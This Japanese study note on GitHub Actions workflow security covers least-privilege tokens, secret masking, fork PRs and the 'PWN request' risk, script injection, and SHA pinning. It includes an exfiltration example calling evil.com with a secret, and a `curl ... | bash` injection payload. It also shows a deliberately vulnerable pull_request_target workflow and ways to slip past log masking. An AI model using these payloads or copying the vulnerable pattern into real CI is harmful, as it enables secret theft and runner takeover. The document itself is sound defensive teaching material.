# Chapter 06: Workflowのセキュリティ

対応Issue: [#9 06: Workflowのセキュリティを学ぶ](https://github.com/urchin-hat/study-github-action/issues/9)

## この章で理解したいこと

- **`permissions` による `GITHUB_TOKEN` の最小権限化**:
  - デフォルト権限（Read/Write）のリスクと、`permissions: read-all` / `permissions: contents: read` 等による絞り込み
  - WorkflowレベルとJobレベルでのスコープ制御
- **`vars` と `secrets` の使い分けと保護**:
  - 非機密設定値（`vars`）と機密情報（`secrets`）の適切な分離
  - ログ出力時の自動マスキング（`***`）の挙動と限界
- **ForkリポジトリからのPRとセキュリティ境界**:
  - ForkからのPRで `secrets` が渡らない理由と安全設計
  - `pull_request` vs `pull_request_target` の違いと重大な脆弱性パターン（PWN request）
- **未信頼の入力とスクリプトインジェクション（Script Injection）**:
  - `${{ github.event.issue.title }}` や `${{ github.head_ref }}` を `run:` に直接埋め込む危険性
  - 環境変数（`env:`）を経由した安全な渡し方
- **サードパーティActionのサプライチェーンセキュリティ**:
  - Actionの発行元（公式 / Verified Creator / 個人）とバージョン指定（tag vs commit SHA）

## GitLab CI/CDとの対応

| GitLab CI/CD | GitHub Actions | 観点 |
| --- | --- | --- |
| `CI_JOB_TOKEN` (パーミッション制限機能あり) | `GITHUB_TOKEN` + `permissions:` | ジョブ実行時の組み込みトークンと権限管理 |
| CI/CD Variables (Masked / Protected) | GitHub Secrets / Repository Variables (`vars`) | 機密情報と非機密設定値の管理 |
| Protected Branches / Environments | `pull_request` の制限 / Environment Protection Rules | 実行環境やブランチに応じたシークレットアクセス制御 |
| スクリプト内での変数展開リスク | `${{ ... }}` の直接展開（インジェクション脆弱性） | 外部入力の展開リスク |
| `include:` での外部CI定義取り込み | サードパーティAction（`uses: ...`） | 外部コードの取り込みとサプライチェーンリスク |

## 最初の方針

1. **`permissions` の実験**:
   - 現在のワークフローに明示的な `permissions` を設定し、最小権限（`contents: read`）にする。
2. **スクリプトインジェクションの実験**:
   - PRのタイトルやコミットメッセージなどを `run: echo "${{ ... }}"` で直接展開した場合と、`env:` 経由で渡した場合の安全性の違いを確認する。
3. **Secrets / Vars のマスキング確認**:
   - `secrets` を渡した際のログマスキング挙動を確認し、露出しない安全な扱い方を検証する。

## 実装前の予想

- [x] `permissions` をトップレベルで宣言しない場合、`GITHUB_TOKEN` にはどのような権限が与えられているか？:
  - 予想: C（デフォルトでは権限なし / None で、明示的に指定しないと動かない）。
  - 実際: **B（リポジトリやOrganizationの設定次第で、読み書き両方 / Read & Write が全開放されている可能性がある）**。
- [x] `${{ github.event.pull_request.title }}` を `run: echo "${{ ... }}"` に直接書くと、どのような攻撃（インジェクション）が可能になるか？:
  - 予想: B（タイトルに `; curl ... | bash` などを仕込むことで、ランナー上で任意のシェルコマンドが勝手に実行される）。
  - 実際: **B（大正解）**。`${{ ... }}` はシェル実行前の単なる「文字列置換」であるため、ダブルクォートで囲っても `"; コマンド; echo "` で簡単に脱出・実行されてしまう。
- [x] `pull_request` と `pull_request_target` で `secrets` や `GITHUB_TOKEN` の権限はどう違うか？（ForkからのPRでsecretsはどうなるか？）:
  - 予想: C（管理者が承認ボタンを押すまでマスクされて隠される）。
  - 実際: **B（通常の `pull_request` では承認の有無に関わらず、ForkからのPRには一切の `secrets` が渡されず空文字になる。GITHUB_TOKEN も強制的に read-only）**。
  - 一方で `pull_request_target` は `main` のコンテキストで動作するため `secrets` も Write権限も渡される。そのため、PR側の未信頼コードをチェックアウトして実行すると「PWN request（トークン奪取）」脆弱性になる。

- [x] `secrets` の値をログに出力した場合、どうなるか？:
  - 予想: B（自動的に `***` にマスキングされる）。
  - 実際: **B（大正解）**。ただしBase64エンコードしたり1文字ずつ分解出力するとマスキングをすり抜ける落とし穴がある（最新ランナーではBase64バリアントも自動マスキングされることを確認）。
- [x] サードパーティActionをタグ（`@v4`）ではなくコミットSHAでピン留めする理由は？:
  - 予想: B（Gitのタグは可変であり、作者アカウント乗っ取り等で後から悪意のあるコミットに付け替えられるリスクがあるため）。
  - 実際: **B（大正解）**。コミットSHAは不変（Immutable）であるためサプライチェーン改ざんを確実に防げる。Dependabotと併用するのがベストプラクティス。

## 壁打ちメモ

### 2026-09-25: Chapter 06開始
- `main` からブランチ `lesson/06-security` を作成。

### 2026-09-25: GITHUB_TOKEN のデフォルト権限の罠（予想と壁打ち）
- 予想: 何も権限がない（C）と思いがち。
- 実際: 歴史的経緯から、リポジトリやOrganizationの設定によって **「Read and write permissions（読み書きフル権限）」がデフォルトになっているケースが非常に多い（B）**。
- **リスク**:
  - フル権限のままだと、悪意のあるサードパーティActionを取り込んだ際や、スクリプトインジェクションが発生した際に、`GITHUB_TOKEN` を使ってリポジトリのコードを直接書き換えられたり、悪意のあるReleaseを公開されたりするリスクがある。
- **対策（最小権限の原則 / Principle of Least Privilege）**:
  - ワークフローファイルで `permissions:` を明示すると、**リポジトリ側の設定を上書きし、指定した権限以外はすべて「None（権限なし）」に強制剥奪** される。
  - 例: `contents: read` だけを指定すれば、コードのチェックアウトだけが許可され、それ以外の書き込み権限はすべて遮断される。

### 2026-09-25: スクリプトインジェクションとパブリックリポジトリのリスク
- **パブリックリポジトリの脅威**:
  - マージ権限自体はリポジトリオーナー（`urchin-hat`）に限定されているが、**「PRが作成された瞬間（マージ前）」にCIが自動起動** する。
  - そのため、悪意のある第三者がForkから細工したPRを送るだけで、ランナー上で任意の攻撃コードが実行されてしまう。
- **インジェクションの仕組み**:
  - `${{ ... }}` はランナーがスクリプトを実行する前に **「単なるテンプレート文字列置換」** を行う。
  - `run: echo "PR: ${{ github.event.pull_request.title }}"` に対して、タイトルが `Test"; echo "HACKED"; echo "` だと、シェルには `echo "PR: Test"; echo "HACKED"; echo ""` として渡され、後ろのコマンドが実行される。
- **防御策（ベストプラクティス）**:
  - **`${{ ... }}` を `run:` に直接書かない**。
  - 必ず `env:` ブロックで環境変数に格納し、シェル内では `$VAR` として参照する。環境変数への代入はメモリ上の文字列データとして扱われるため、コマンドとして解釈される余地がない。

### 2026-09-25: ForkからのPRとSecrets、最凶の脆弱性「pull_request_target」
- **ForkからのPRには一切のSecretsが渡らない（B）**:
  - 初回コントリビューターの承認機能（C）はあるが、承認してワークフローが動いたとしても、通常の `on: pull_request` では **Secretsは完全に空（空文字）** になる。
  - `GITHUB_TOKEN` も強制的に読み取り専用（read-only）になる。
  - 理由: もし渡ってしまうと、攻撃者がFork側で `.github/workflows/` やテストコードに `curl evil.com?leak=$SECRET` を仕込んでPRを投げるだけで機密情報を持ち出せてしまうから。
- **`pull_request_target` の落とし穴（PWN request）**:
  - 「ForkからのPRでもPRに自動コメント（write権限）したい」「SonarQubeなどの解析トークンを使いたい」という要求のために `on: pull_request_target` が用意された。
  - `pull_request_target` は `main` ブランチのコンテキストで動くため、**Secretsも渡され、Write権限も付与される**。
  - **最悪のアンチパターン**:
    ```yaml
    on: pull_request_target
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }} # ← Fork側の未信頼コードをチェックアウト
      - run: npm test # ← 攻撃者の仕込んだ悪意あるコードが、本家のSecrets＆Write権限で実行される！
    ```
  - これがGitHub Actions界で最も悪名高い **「PWN request」脆弱性**。
- **GitLab CI/CD（社内利用）との決定的な違い**:
  - GitLab CI/CDを社内イントラ等の閉じた環境で使っている場合、「同一リポジトリ内のブランチ間マージ」が主であり、コントリビューターは全員同じ社内メンバーという前提になりやすい。
  - しかしGitHub（特にパブリック）では、Forkは「第三者が管理する完全に隔離された別のリポジトリ」であり、そこから来るPRは **信頼境界（Trust Boundary）の外側から届く未信頼データ** であるという前提認識が死活的に重要となる。

### 2026-09-25: vars と secrets の使い分けと自動マスキングの限界
- **`vars` vs `secrets` の使い分け**:
  - `vars`（Repository Variables）: 環境名（staging, production）、ログレベル、非機密なエンドポイントURLなど。平文でログに表示される。
  - `secrets`: APIキー、パスワード、秘密鍵、トークンなど。自動的に `***` にマスキングされ、ForkからのPRには渡らない。
- **自動マスキングの仕組みと限界（過信は禁物）**:
  - ランナーは使用されたSecretsの文字列をメモリ上に持ち、ログ出力ストリーム中にその文字列が出現すると `***` に置き換える。
  - **マスキングをすり抜ける落とし穴**:
    - ① **Base64 / URLエンコード**: 以前はBase64にするとマスクをすり抜けて露出する問題があったが、最新ランナーではBase64バリアントも自動計算してマスクされることを今回の実験で確認。ただしURLエンコードやカスタム加工による漏洩リスクはあるため過信は禁物。
    - ② **短すぎるシークレット**: 1〜3文字などの短い値は誤検知防止のためマスクされなかったり、逆に関係ないログが `***` まみれになる。
    - ③ **文字単位の分解出力**: ループで1文字ずつ出力すると完全一致しないためマスクを突破される。

### 2026-09-25: サードパーティActionのサプライチェーン対策とコミットSHAピン留め
- **なぜタグ（`@v4`）ではなくコミットSHAで指定するのか**:
  - Gitのタグ（Tag）やブランチ（Branch）は可変（Mutable）であり、後から別のコミットへ強制付け替え（Force Push）が可能。
  - もしActionの作者アカウントが乗っ取られたり、悪意のあるコミットがタグに上書きされた場合、利用者のリポジトリ定義を変更することなく悪意のあるコードが実行されてしまう。
  - **コミットSHA（40桁ハッシュ）** は不変（Immutable）であるため、内容が絶対に変わらない。
- **SHA指定運用の最適解（Dependabot）**:
  - SHAで指定すると「新バージョン追従が大変」という課題があるが、GitHub公式の **Dependabot version updates** を導入することで、Actionの更新PRが自動生成され、安全性とメンテナンス性を両立できる。
- **Actionの信頼性判断**:
  - GitHub公式（`actions/*`）
  - Verified Creator（青い認証バッジの付いた企業公式）
  - コミュニティ製（スター数、コミット履歴、メンテ状況、Issueの活発さを必ず確認する）

### 2026-09-25: 課金budget（Spending limit）と利用通知
- **パブリックリポジトリ**: GitHub Actionsの実行時間は無制限・無料。
- **プライベートリポジトリ**: 無料枠（月間2,000分等）超過時は従量課金。
- **予期せぬ課金を防ぐ防壁**:
  - ① GitHubアカウント/Organization設定の `Billing and plans` → `Spending limit` で上限額（$0など）を設定する。
  - ② 各Jobに `timeout-minutes: 5` などを必ず設定し、無限ループやデッドロックによる長時間のランナー占有・時間浪費を防ぐ。







## 試したことと結果

### 実験1: `permissions: contents: read` による最小権限化の確認

- PR: [#19](https://github.com/urchin-hat/study-github-action/pull/19)
- Workflow Run: [36024262344](https://github.com/urchin-hat/study-github-action/actions/runs/36024262344)
- 目的:
  - ワークフローのトップレベルに `permissions: contents: read` を宣言し、CI（Checkout、Test、Build、Artifact受け渡し）が正常に完走することを確認する。
  - ジョブ開始時の `Set up job` ステップのログで、付与された `GITHUB_TOKEN Permissions` を確認する。

#### 実行結果
- 各ジョブのステータス: ✅ **All checks passed (6/6 success)**
- `Set up job` 内の `GITHUB_TOKEN Permissions` ログ比較:
  - **変更前（未指定時: Run 36023411659）**:
    ```text
    GITHUB_TOKEN Permissions
    Contents: read
    Metadata: read
    Packages: read
    ```
    ※リポジトリのデフォルト設定に従い、`Packages: read` なども付与されていた。
  - **変更後（`permissions: contents: read` 明示時: Run 36024262344）**:
    ```text
    GITHUB_TOKEN Permissions
    Contents: read
    Metadata: read
    ```
    ※明示した `Contents: read` と最小限必要な `Metadata: read` 以外、すべての権限（Packages, Issues, Pull Requests, Deployments等）が剥奪され、最小権限化が確認できた。

#### 分かったこと
- **ログの可視性**:
  - `GITHUB_TOKEN` にどのような権限が付与されているかは、各Jobの最初のステップ `Set up job` のログにある `GITHUB_TOKEN Permissions` グループでいつでも確認できる。
- **ワークフローでの明示の重要性**:
  - リポジトリやOrganizationの設定に依存せず、コード側で `permissions:` を書くことで、予期せぬ強い権限が付与される事故を確実に防ぐことができる。

### 実験2: スクリプトインジェクションの再現と環境変数（`env:`）による防御

- PR: [#19](https://github.com/urchin-hat/study-github-action/pull/19)
- Workflow Run: [36024864301](https://github.com/urchin-hat/study-github-action/actions/runs/36024864301)（Job: `Security: Script Injection Test`）
- 目的:
  - 攻撃文字列（`Fix bug"; echo "🚨 [EXPLOIT] Injected command executed! 🚨"; echo "`）を用意し、
    1. `run:` 内に `${{ ... }}` で直接文字列展開した場合（脆弱なコード）
    2. `env:` ブロックで環境変数として渡してシェル内で `$VAR` として参照した場合（安全なコード）
    のログ出力を比較・検証する。

#### 実行結果
- **1. 脆弱な直接展開のログ**:
  ```text
  ##[group]Run echo "=== 1. Vulnerable Example: Direct Interpolation ==="
  echo "=== 1. Vulnerable Example: Direct Interpolation ==="
  echo "Input was: Fix bug"; echo "🚨 [EXPLOIT] Injected command executed! 🚨"; echo ""
  ##[endgroup]
  === 1. Vulnerable Example: Direct Interpolation ===
  Input was: Fix bug
  🚨 [EXPLOIT] Injected command executed! 🚨
  ```
  - `${{ ... }}` がシェル起動前に文字列置換された結果、ダブルクォートが閉じられて `echo "🚨 [EXPLOIT]..."` が**独立したシェルコマンドとしてそのまま実行されてしまった**。
- **2. 安全な環境変数経由のログ**:
  ```text
  ##[group]Run echo "=== 2. Safe Example: Pass via Environment Variable ==="
  echo "=== 2. Safe Example: Pass via Environment Variable ==="
  echo "Input was: $UNTRUSTED_INPUT"
  env:
    UNTRUSTED_INPUT: Fix bug"; echo "🚨 [EXPLOIT] Injected command executed! 🚨"; echo "
  ##[endgroup]
  === 2. Safe Example: Pass via Environment Variable ===
  Input was: Fix bug"; echo "🚨 [EXPLOIT] Injected command executed! 🚨"; echo "
  ```
  - シェルに渡されたコードは `echo "Input was: $UNTRUSTED_INPUT"` のままであり、入力値はプロセス環境変数の値（メモリ上のプレーンテキスト）として安全に扱われた。
  - セミコロンやダブルクォートがコマンドとして解釈されることは一切なく、1行の文字列として安全に出力された。

#### 分かったこと
- **`${{ ... }}` はスクリプトに直接展開してはならない（絶対ルール）**:
  - PRのタイトル、本文、ブランチ名、コミットメッセージ、Issueのコメントなど、**外部ユーザーが自由に書き込めるコンテキストはすべて未信頼（Untrusted Input）** である。
  - これらを `run:` のシェルスクリプト内で `${{ ... }}` として直接埋め込むと、スクリプトインジェクションによりランナーが乗っ取られる。
- **防御は必ず `env:` を介すこと**:
  - `env:` で一度環境変数に格納してから `$VAR`（bashの場合）で参照すれば、完全にインジェクションを防ぐことができる。

### 実験3: `vars` と `secrets` の挙動比較と自動マスキングの検証

- PR: [#19](https://github.com/urchin-hat/study-github-action/pull/19)
- Workflow Run: [36025610401](https://github.com/urchin-hat/study-github-action/actions/runs/36025610401)（Job: `Security: Script Injection Test`）
- 目的:
  - リポジトリに非機密変数 `vars.TEST_VAR`（`non-secret-app-setting`）とシークレット `secrets.TEST_SECRET`（`my-super-secret-password-12345`）を登録。
  - ログ出力における挙動（平文表示 vs 自動マスキング `***`）を確認する。
  - `base64` エンコードした際にマスキングをすり抜けるかどうかの落とし穴を検証する。

#### 実行結果
- 実行ログ:
  ```text
  === 1. Normal Variable (vars) ===
  Variable value is: non-secret-app-setting

  === 2. Secret (secrets) Automatic Masking ===
  Secret value is: ***

  === 3. Masking Bypass Pitfall (Base64) ===
  Base64 encoded secret is: ***
  ```

#### 分かったこと
- **`vars` は平文で表示**:
  - `vars.TEST_VAR` は意図通り平文でそのままログに出力される。環境名やエンドポイントなど、見えても良い設定値の置き場として機能する。
- **`secrets` は自動で `***` に置換**:
  - `secrets.TEST_SECRET` の値はランナーがメモリ上で検知し、ログ出力ストリーム内で完全に `***` にマスキングされた。
- **最新ランナーの強力なマスキング保護（Base64も自動検知！）**:
  - 当初の予想では「Base64エンコードすると平文のBase64文字列として露出する」と思われたが、**近年のGitHub ActionsランナーはBase64エンコードされたバリアントも自動計算してマスキング（`***`）する** よう進化していることが判明した！
  - ただし、文字の分割出力やカスタム暗号化など未知の変換を施すと漏洩リスクがあるため、「ログにシークレットを渡さない・出力させない」という根本原則が最重要であることに変わりはない。




## つまずいた点

- **`GITHUB_TOKEN` の暗黙権限の強さ**:
  - 何も指定しないと、リポジトリやOrganizationの設定によってフル権限（Read & Write）が与えられてしまう点。リポジトリ設定に頼るのではなく、Workflowファイル冒頭に `permissions:` を書く習慣付けが不可欠。
- **スクリプトインジェクションの恐ろしさ**:
  - シェルスクリプト側で `echo "${{ ... }}"` と書くと、文字列置換がシェル実行前に行われるため、ダブルクォートで保護していてもコマンドとして突き抜けて実行されてしまう。環境変数 `env:` を介すことの重要性を痛感した。
- **ForkからのPRと `pull_request_target` の危険性**:
  - ForkからのPRにSecretsが渡らないのは正常な防御壁であり、それを回避しようとして `pull_request_target` でPRコードをチェックアウトして動かす「PWN request」アンチパターンの怖さを理解した。

## ブログへ残したい要点

- **GitHub Actionsセキュリティの3大防壁**:
  1. **`permissions: contents: read` をトップレベルに必ず書く**: リポジトリ設定に関わらず、最小権限の原則（Least Privilege）をコードで強制する。
  2. **未信頼の入力（`${{ ... }}`）は `run:` に直接埋め込まず、必ず `env:` を経由する**: PRタイトルやブランチ名からのスクリプトインジェクションを100%遮断する。
  3. **ForkからのPRは「信頼境界の外側」**: `pull_request_target` でFork側のコードをチェックアウトして実行してはならない（PWN requestの回避）。
- **`vars` と `secrets` の使い分け**:
  - 見えて良い非機密設定値は `vars`、漏れてはならないクレデンシャルは `secrets`。
  - 最新ランナーはBase64バリアントも自動で `***` にマスクしてくれることが実験で判明したが、そもそもログに出力させない設計が鉄則。
- **サードパーティActionのコミットSHAピン留め**:
  - Gitのタグ（`@v4`）は付け替え可能なため、サプライチェーン攻撃対策にはコミットSHA（40桁ハッシュ）によるピン留めと、Dependabot による自動更新PRの組み合わせが最も堅牢。
- **課金リミットとタイムアウト**:
  - `timeout-minutes: 5` などのタイムアウト設定と、GitHubアカウント側の Spending limit 設定で予期せぬ過剰課金を防ぐ。

